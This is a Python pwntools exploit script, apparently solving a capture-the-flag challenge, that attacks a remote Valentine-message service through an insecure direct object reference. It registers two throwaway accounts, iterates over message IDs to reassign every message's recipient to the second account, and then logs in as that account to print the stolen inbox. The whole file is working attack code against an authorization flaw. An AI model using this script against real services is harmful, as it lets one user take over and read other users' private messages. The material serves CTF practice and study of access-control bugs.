#!/usr/bin/env python3

from pwn import *
import sys
import random
import string
import re

def randstr(n=8):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(n))

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <ip> <port>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])

io = remote(ip, port)

user1 = randstr()
pass1 = randstr()

user2 = randstr()
pass2 = randstr()

# =========================
# Register User1
# =========================
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Username: ", user1.encode())
io.sendlineafter(b"Password: ", pass1.encode())

# =========================
# Register User2
# =========================
io.sendlineafter(b"> ", b"1")
io.sendlineafter(b"Username: ", user2.encode())
io.sendlineafter(b"Password: ", pass2.encode())

# =========================
# Login User1
# =========================
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Username: ", user1.encode())
io.sendlineafter(b"Password: ", pass1.encode())

# =========================
# Try IDOR on message IDs
# =========================
def change_recipient(msg_id):
    # Change recipient
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"Valentine ID: ", str(msg_id).encode())
    io.sendlineafter(b"New recipient username: ", user2.encode())

    return io.recvuntil(b"6. Logout\n")
    
msg_id = 1
while True:
    data = change_recipient(msg_id)

    if b"Valentine not found!" in data:
        break

    msg_id += 1
# =========================
# Logout User1
# =========================
io.sendlineafter(b"> ", b"6")

# =========================
# Login User2
# =========================
io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"Username: ", user2.encode())
io.sendlineafter(b"Password: ", pass2.encode())

# =========================
# View inbox
# =========================
io.sendlineafter(b"> ", b"2")
data = io.recvall(timeout=3)
print(data.decode(errors="ignore"))

io.close()
